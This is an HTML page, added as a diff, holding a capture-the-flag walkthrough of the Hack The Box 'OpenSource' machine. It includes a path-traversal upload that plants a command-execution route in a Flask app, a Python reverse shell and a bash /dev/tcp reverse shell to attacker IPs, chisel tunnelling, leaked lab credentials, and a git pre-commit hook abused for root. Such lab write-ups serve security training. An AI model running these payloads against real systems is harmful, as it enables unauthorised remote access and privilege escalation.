@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>HTB OpenSource - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">HTB OpenSource</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1677699178530"
+                  >2023-03-01 14:32</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678122539959"
+                  >2023-03-06 12:08</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We start with an initial nmap scan:<br />
+nmap -sV -sC -oA nmap/initial 10.10.11.164<br />
+<img src="/_resources/62ad448f408e4e01bd1d82d9b8ab939f.png" /></p>
+<p>Not sure what the service on port 3000 is, and a banner grab fails.</p>
+<p>We run a full port scan:<br />
+nmap -sV -sC -p- -oA nmap/full 10.10.11.164<br />
+<img src="/_resources/7874079ff60040a0bd5a1827f6d423b5.png" /></p>
+<p>We see a webserver running on port 80 now,<br />
+Werkzeug/2.1.2 Python/3.10.3</p>
+<p><img src="/_resources/bdffeaec5f5348f4825c254869281819.png" /></p>
+<p>We run feroxbuster:<br />
+<img src="/_resources/2a53bdea5c4641488cef508b7cbbff84.png" /><br />
+There is a console on this Werkzeug server:<br />
+<img src="/_resources/dd6edcc723ad4ea7bdb50aed0cd84f3e.png" /></p>
+<p>We know that there is a way to bypass the Pin.</p>
+<p>But we keep looking for other areas to exploit.<br />
+The download link allows us to download the source of the site as a zip file.</p>
+<p>There is also a link to an upload site:<br />
+<a title="http://10.10.11.164/upcloud" href="http://10.10.11.164/upcloud">http://10.10.11.164/upcloud</a></p>
+<p>We can see by looking through the source code, what kind of file the upload is expecting, and what is being used to parse it.<br />
+<img src="/_resources/6998f75319c44a3b8539ba3ce2a28ae7.png" /></p>
+<p>We can try to look at the code for the popper.js<br />
+Without understanding what the code is doing it's not very useful.<br />
+We check to see if there are any git logs:<br />
+git log:<br />
+<img src="/_resources/8678a29f95304e938b14566f2db93abb.png" /></p>
+<p>We run git show against the latest commit to see what we can learn:<br />
+<img src="/_resources/ad15ca48e89144ffbe771bb8abe22bc6.png" /><br />
+git branch tells us there are multiple repos:<br />
+<img src="/_resources/8227ff7dcf2c442398555971f52358ea.png" /></p>
+<p>We use the command git checkout dev to switch branches, and the run git log again:<br />
+<img src="/_resources/3716303aa6c146df9afb0fc557b168e0.png" /></p>
+<p>We can compare the differences between the first and last commit using git diff:<br />
+The main difference is the existence of a file that is not in the most recent version:<br />
+<img src="/_resources/4e23301f9c494a288ff913977a87f8f0.png" /></p>
+<p>We can load that git branch using the git checkout command again, and then read the file:<br />
+git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820<br />
+<img src="/_resources/10c381ca653941e3986df795ba746f92.png" /></p>
+<p>We may have credentials of the user who uploaded the file now:<br />
+<img src="/_resources/0628c9998eff45668b5fe57c137cc343.png" /><br />
+dev01:Soulless_Developer#2022</p>
+<p>Looking at the views.py file, that the app uses to upload files, we can see a vulnerability in the code. The os.path.join function tells the script to write a file path name on the server where the upload is going:<br />
+<img src="/_resources/5277f675f19b41f8af02bed34a57e012.png" /></p>
+<p>Because we control the filename, we may be able to use directory traversal. Looking at the utils.py file, we can see that ../ is not allowed, but when we create a file name with /file it overwrites the public/uploads directory. Essentially, we can create our own subdirectory and control it however we want.<br />
+<img src="/_resources/164365913b7a4c919f07e9cadc360428.png" /></p>
+<p>To do this, we need to modify the source code, and then upload it to the server.<br />
+If we were to modify the views.py file to include the following code, we can use python for command execution:</p>
+<p>@app.route('/run/<cmd class="jop-noMdConv">')<br />
+def run_command(cmd):<br />
+return subprocess.check_output(cmd.split(" "))</cmd></p>
+<p>We intercept the file upload through burpsuite and add our line of code to the end of the file:<br />
+<img src="/_resources/4e65994a9c99479fbd72c38b2d6d0349.png" /><br />
+<img src="/_resources/505d34f271a6467593b7947424d3a9fb.png" /></p>
+<p>We also modify the file location at the top of the request to be /app/app/views.py:<br />
+<img src="/_resources/b51584552cfc40e7ad09abf2e84810e7.png" /></p>
+<p>We have code execution:<br />
+<img src="/_resources/83b7c3574cdf42a3ab049def1a4e4293.png" /></p>
+<p>We can try to see which shell is running. We run which sh and find that /bin/sh is running.<br />
+<img src="/_resources/30fcb1683c9046448ac4879473dd2d6e.png" /></p>
+<p>Now we can try to upload a reverse shell using the following:<br />
+import socket<br />
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />
+s.connect(("10.10.14.8",80))<br />
+os.dup2(s.fileno(),0)<br />
+os.dup2(s.fileno(),1)<br />
+os.dup2(s.fileno(),2)<br />
+import pty<br />
+pty.spawn("/bin/sh")</p>
+<p><img src="/_resources/65bc626ac93b402b9d72e0acf869fb8b.png" /></p>
+<p>We add that portion to our burp request:<br />
+<img src="/_resources/6761cf625c5841678ece8a4015b8dce8.png" /></p>
+<p>We change the port to 1337, and then we get a our shell:<br />
+<img src="/_resources/9ca566c35ef74ac6b4e7f40fd8ab2ed0.png" /></p>
+<p>The shell is within the docker and we can confirm this by looking at the ip address:<br />
+<img src="/_resources/738ab5eb855e4f138aa16c922e6562fd.png" /></p>
+<p>We can try to interact with the host machine using 172.17.0.1 by running nc to banner grab port 22<br />
+<img src="/_resources/5a4677a28f8e42268d6fde0ad2bfcf69.png" /></p>
+<p>We can confirm that the service on port 3000 is a webserver by using nc to make a get request:<br />
+<img src="/_resources/0600ecdc1439418c89b25140c6752e83.png" /><br />
+We make another Get request using the Host as the ip of the host machine and get a page back with a gitea header:<br />
+<img src="/_resources/2f056ce03e4840659819f1ca05864a95.png" /></p>
+<p>We upload chisel to the box to try to connect to the service locally:<br />
+<img src="/_resources/a93c7247692d48758eb739a56e2746dc.png" /></p>
+<p>We start chisel on our machine:<br />
+./chisel64 server -p 8001 --reverse<br />
+On the target we use:<br />
+./chisel64 client 10.10.14.8:8001 R:socks<br />
+<img src="/_resources/38da83c9a74e4ef2893d554d193a5b70.png" /></p>
+<p>We see that we opened port 1080 on the target machine.<br />
+We set up a socks5 proxy on FoxyProxy:<br />
+<img src="/_resources/bc6cfb430b204da1bd3585c3551359c6.png" /></p>
+<p>Now we can view the page on port 3000:<br />
+<img src="/_resources/2d618051a9ed4db28d989c3075043c89.png" /></p>
+<p>There is a sign in page, and we can try the credentials we found earlier.<br />
+<img src="/_resources/bdf93ad82f084a0eb6f8609943f04d85.png" /></p>
+<p>We can login:<br />
+<img src="/_resources/381192a26ec3466a83cf3a04a7395765.png" /><br />
+Within the portal there is a home-backup folder with .ssh credentials:<br />
+<img src="/_resources/1d6e4c8e2c0642c2aea0e170b437ae6c.png" /></p>
+<p>We copy the key locally and then chmod 600 and run:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa_opensource dev01@10.10.11.164</p>
+<p><img src="/_resources/377a7543e9334b1da2b624b71ea32fa5.png" /><br />
+ef8673f7f66ee54589e46ab7ed5c3c37</p>
+<p>There is a folder .git that is updated constantly:<br />
+<img src="/_resources/c9ff9af6bb2b451cad8a128e2e139030.png" /></p>
+<p>We upload pspy and run it to see what processes are taking place:<br />
+<img src="/_resources/865d7e7984f2473897d864dd881e0449.png" /><br />
+This command seems to run every minute:<br />
+<img src="/_resources/7572b4ede4d84747b661c070909bc4e7.png" /></p>
+<p>We can go look at what that file is doing.<br />
+<img src="/_resources/ee71e50e671341f8bcfcd945adb729db.png" /></p>
+<p>The file is a bash script that runs a command, and checks for changes then makes a git commit. Perhaps we can add a file in /home/dev01 that calls a reverse shell for us.</p>
+<p>We can make a script file that executes:<br />
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.3/31337 0&gt;&amp;1</p>
+<p>Inside the /home/dev01/.git folder there is a hooks folder that we could potentially modify since there are bash scripts there already:<br />
+<img src="/_resources/b979d7a9fa4f4cdaa0511a07e2375b3c.png" /></p>
+<p>We write to a file called pre-commit:<br />
+<img src="/_resources/eb90a71395754a2582e02fea529de3c0.png" /><br />
+We make that script executable by using chmod +x pre-commit</p>
+<p>We make a new file in the /home/dev01 folder so that the git commit will happen, and then wait to see if a shell executes.<br />
+<img src="/_resources/879d694cbc6b424e8082e27680e22ce1.png" /></p>
+<p>Now we have a root shell:<br />
+<img src="/_resources/5d7db74bbddf4f4db320af1517c8a148.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
